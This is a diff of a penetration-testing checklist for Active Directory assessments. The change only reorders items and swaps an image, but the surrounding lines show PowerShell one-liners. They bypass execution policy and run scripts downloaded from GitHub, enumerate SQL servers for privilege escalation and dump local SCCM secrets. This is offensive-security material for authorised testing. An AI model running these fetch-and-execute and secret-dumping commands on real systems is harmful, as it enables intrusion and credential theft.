@@ -34,17 +34,15 @@ For most assessments it makes sense to follow up enumeration on a provided devic
 powershell -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1')"
 ```
 
-<img width="1515" height="770" alt="image" src="https://github.com/user-attachments/assets/3f9f654a-5464-44ad-aab4-04b27d8e6354" />
+<img width="1597" height="856" alt="image" src="https://github.com/user-attachments/assets/c48f4890-090f-484a-8ee4-db682bd1f0ab" />
 
-
-- [ ] Pingcastle
+- [ ] Snaffler
+- [ ] Seatbelt
 - [ ] MSSQL
 ```powershell
 IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"} | Get-SQLServerPrivEscRowThreated | Out-File "$env:USERPROFILE\Downloads\fkad\mssql_priv.txt"
 ```
-- [ ] Seatbelt
-- [ ] Snaffler
 - [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
 ```powershell
 SharpSCCM.exe local secrets -m disk
